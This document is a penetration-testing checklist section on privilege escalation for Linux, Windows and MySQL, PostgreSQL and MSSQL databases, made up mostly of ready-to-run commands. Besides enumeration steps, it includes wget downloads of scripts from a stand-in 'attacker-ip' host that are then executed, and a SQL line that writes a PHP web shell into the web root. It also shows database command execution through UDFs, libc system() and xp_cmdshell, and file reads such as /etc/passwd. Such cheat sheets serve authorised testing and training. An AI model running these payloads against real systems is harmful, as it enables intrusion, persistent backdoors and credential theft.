## ⬆️ Phase 5: Advanced Privilege Escalation

### Linux Privilege Escalation (Comprehensive)

#### Automated Enumeration Scripts
- [ ] **LinPEAS**:
  ```bash
  wget http://attacker-ip/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh | tee linpeas_output.txt
  ```
- [ ] **LinEnum**:
  ```bash
  wget http://attacker-ip/LinEnum.sh
  chmod +x LinEnum.sh
  ./LinEnum.sh -t
  ```
- [ ] **Linux Smart Enumeration**:
  ```bash
  wget http://attacker-ip/lse.sh
  chmod +x lse.sh
  ./lse.sh -l2
  ```

#### Manual Privilege Escalation Checks

##### SUID/SGID Binaries
- [ ] **Find SUID Files**:
  ```bash
  find / -perm -u=s -type f 2>/dev/null
  find / -perm -4000 -type f 2>/dev/null
  ```
- [ ] **Find SGID Files**:
  ```bash
  find / -perm -g=s -type f 2>/dev/null
  find / -perm -2000 -type f 2>/dev/null
  ```
- [ ] **GTFOBins Check**: Cross-reference found binaries with GTFOBins

##### Sudo Privileges
- [ ] **Check Sudo Rights**:
  ```bash
  sudo -l
  ```
- [ ] **Sudo Version Check**:
  ```bash
  sudo --version  # Check for CVE-2021-4034 (PwnKit) and others
  ```

##### Capabilities
- [ ] **Check File Capabilities**:
  ```bash
  getcap -r / 2>/dev/null
  ```

##### Cron Jobs
- [ ] **System Cron Jobs**:
  ```bash
  cat /etc/crontab
  ls -la /etc/cron.*
  crontab -l
  ```
- [ ] **Process Monitoring**:
  ```bash
  # Run pspy or monitor /proc/*/cmdline
  watch -n 1 'ps aux --forest'
  ```

##### Writable Files & Directories
- [ ] **World-Writable Files**:
  ```bash
  find / -writable -type f 2>/dev/null | grep -v proc
  ```
- [ ] **Configuration Files**:
  ```bash
  find /etc -writable -type f 2>/dev/null
  ```

##### Kernel Exploits
- [ ] **Kernel Version Check**:
  ```bash
  uname -r
  cat /proc/version
  ```
- [ ] **Search for Kernel Exploits**:
  ```bash
  searchsploit linux kernel <version>
  ```

##### Network & Services
- [ ] **Internal Services**:
  ```bash
  netstat -ano | grep LISTEN
  ss -tlnp
  ```
- [ ] **Docker Breakout** (if in container):
  ```bash
  ls -la /.dockerenv
  cat /proc/1/cgroup
  ```

### Windows Privilege Escalation (Comprehensive)

#### Automated Enumeration Scripts
- [ ] **WinPEAS**:
  ```cmd
  winPEAS.exe
  winPEAS.bat
  ```
- [ ] **PowerUp** (PowerShell):
  ```powershell
  Import-Module PowerUp.ps1
  Invoke-AllChecks
  ```
- [ ] **Sherlock** (PowerShell):
  ```powershell
  Import-Module Sherlock.ps1
  Find-AllVulns
  ```

#### Manual Windows Privilege Escalation

##### System Information
- [ ] **Patch Level**:
  ```cmd
  systeminfo
  wmic qfe list
  ```

##### User & Group Information
- [ ] **Current User Privileges**:
  ```cmd
  whoami /priv
  whoami /groups
  ```

##### Service Misconfigurations
- [ ] **Unquoted Service Paths**:
  ```cmd
  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
  ```
- [ ] **Service Permissions**:
  ```cmd
  accesschk.exe -uwcqv "Authenticated Users" *
  ```

##### Registry Privilege Escalation
- [ ] **AlwaysInstallElevated**:
  ```cmd
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```

##### Stored Credentials
- [ ] **Credential Manager**:
  ```cmd
  cmdkey /list
  ```
- [ ] **Unattend Files**:
  ```cmd
  dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
  ```

##### DLL Hijacking
- [ ] **Check for Missing DLLs**:
  ```cmd
  # Use Process Monitor or PowerUp
  ```

### Database Privilege Escalation

#### MySQL
- [ ] **User-Defined Functions**:
  ```sql
  SELECT * FROM mysql.func;
  CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';
  SELECT sys_exec('id');
  ```
- [ ] **File Operations**:
  ```sql
  SELECT LOAD_FILE('/etc/passwd');
  SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
  ```

#### PostgreSQL
- [ ] **Command Execution**:
  ```sql
  CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
  SELECT system('id');
  ```

#### MSSQL
- [ ] **xp_cmdshell**:
  ```sql
  EXEC sp_configure 'show advanced options', 1;
  RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;
  EXEC xp_cmdshell 'whoami';
  ```

---